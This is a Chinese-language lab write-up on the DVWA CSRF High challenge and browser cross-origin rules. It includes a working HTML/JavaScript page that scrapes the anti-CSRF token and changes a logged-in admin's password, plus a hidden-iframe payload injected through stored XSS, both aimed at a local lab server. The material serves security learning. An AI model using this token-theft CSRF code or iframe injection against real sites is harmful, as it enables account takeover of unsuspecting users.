[TOC]



# ==网站跨域访问==

上面我们在做DVWA-CSRF-High题目时，我们大致的流程如下图

![image-20240812112949728](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812112949728.png)

但这样的方式，两个服务器之间无非就是相当于攻击者作为用户访问应用服务器并注入代码，而攻击服务器与应用服务器二者服务器与服务器之间并没有实质性联系，甚至远程包含代码也是192.168.230.2的浏览器解析引擎解析了 js 的<script>标签之后才远程包含的攻击服务器上的代码，相当于是在用户本地给应用服务器发送的请求，所以二者服务器与服务器之间并没有形成服务器的跨域访问。

为了让服务器之间形成跨域访问，我们需要将js文件修改为html文件，直接访问该html文件就可以在攻击服务器上直接向应用服务器发送请求了

## 一、应用服务器本地处理DVWA-CSRF-High

### 1、攻击手段

**如果**在应用服务器本身创建一个HTML页面，在XSS中进行调用，这样确实可以解决CSRF-High的问题（记住这里说的是如果，因为该脚本我们作为攻击者是无法放在应用服务器上去的，现在只是通过这个来和下面远程HTML页面的实验做对比）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript">
        var gettokenurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/";
        var count = 0; // 限制请求循环发送
        // 实例化XMLHttpRequest,用于发松AJAX请求
        xmlhttp = new XMLHttpRequest();
        // 当请求的状态发生改变，触发执行代码
        xmlhttp.onreadystatechange = function() {
            // 状态码：0 - 请求未初始化；1 - 服务器链接已建立；2 - 请求已接收；3 - 请求处理中；4 - 请求已完成，且响应已就绪
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                // 处理成功响应的代码,并从中通过正则提取Token
                var text = xmlhttp.responseText;
                var regex = /user_token\' value=\'(.*?)\' \/\>/;
                var match = text.match(regex);
                // alert(match[1]);
                var token = match[1];

                var changepasswdurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/?password_new=654321&password_conf=654321&Change=Change&user_token="+token;
                if (count == 0) {
                    count=1;
                    xmlhttp.open("GET",changepasswdurl,false); // false 代表同步方式发送
                    xmlhttp.send();
                }
            }
        };
        xmlhttp.open("GET",gettokenurl,false);
        xmlhttp.send();
    </script>
    <title>CSRF</title>
</head>
<body>
    <script>
        location.href="http://192.168.230.147/DVWA/vulnerabilities/xss_s/";
    </script>
</body>
</html>
```

采用符合CSRF的 “One Click” 特性的操作，直接将超链接 `http://192.168.230.147/security/csrf.html` 发给受害者（受害者需已登录目标应用服务器），诱使其点击

> 我们依旧可以借助XSS_S漏洞，提交一个 <iframe> 标签：`<iframe src="http://192.168.230.147/security/csrf.html" style="display:none">` 其中 `display:none` 表示看不见该 <iframe> 要想看见可以使用 `display:block` 

### 2、实验

现在我们让受害者admin访问该链接，利用Fiddler抓包看看流量情况

![image-20240812165518487](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812165518487.png)

​	点击访问，结果找不到对象，再去看流量

![image-20240812165609675](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812165609675.png)

呵呵，该干的都已经干了

![image-20240812165736621](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812165736621.png)

- 第一个请求：访问我放在应用服务器上的csrf.html代码
- 第二个请求：代码向csrf页面发送请求，为了获取响应，提取Token
- 第三个请求：更改密码
- 第四个请求：回退到上一个页面（访问csrf.html页面请求头中的Referer）

现在admin用户的密码已经被修改为654321了

### 3、上述操作存在的问题

- 真实场景下，我们是无法将csrf.html页面存放到应用服务器本身中去，如果可以，还做啥CSRF啊
- 那么我们如果将csrf.html页面存放到攻击者服务器上去，然后由受害者点击访问会怎么样呢。

## 二、攻击服务器跨域处理DVWA-CSRF-High

我们在攻击服务器上也存放一个csrf.html页面，然后诱使受害者去访问，利用Fiddler抓包分析流量

![image-20240812174816685](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812174816685.png)

![image-20240812174804069](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812174804069.png)

我们可以看到

- 第一个请求：受害者访问到攻击服务器上的csrf.html文件

- 第二个请求：然后攻击者服务器接着向应用服务器的csrf页面发送请求，妄图通过响应中提取Token，但是

  ![image-20240812175413193](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812175413193.png)

  我们可以发现，响应中什么都没有，还给我设置了Cookie？，而且请求头中给我带上了一个Origin请求字段，这是什么东东？还是写的192.168.230.135

## 三、什么是跨域访问

### 1、HTTP请求头

（1）HOST：表示当前请求要被发送的目的地址，仅包括域名和端口号。在任何类型请求中，request都会包含此header信息

（2）Referer：Referer请求头字段包含了当前请求页面的来源页面地址，即表示当前页面是通过此来源页面里的链接访问的。它由协议+域名+查询参数组成（不包含锚点信息），所有请求都包含此header字段

（3）Origin：表示这个请求原始是从哪发起的，包括当前请求的协议+域名+端口号。特别注意：这个参数一般只存在于CSRF跨域请求（起始与目的站的端口号不同，或域名不同，或协议不同的请求成为跨域请求）中，非跨域请求头中没有这个字段，这也算是浏览器自带的一种安全机制

### 2、同源策略

![image-20240812180155880](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240812180155880.png)

### 3、跨域访问

在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问问题。在请求的过程中我们要想回去数据一般都是post/get请求，所以，跨域问题出现，受浏览器同源策略的限制，要在浏览器中实现跨域访问，需要使用专门的解决方案。

### 4、如何跨域

（1）JSONP方案

（2）CORS方案

（3）WebSocket通信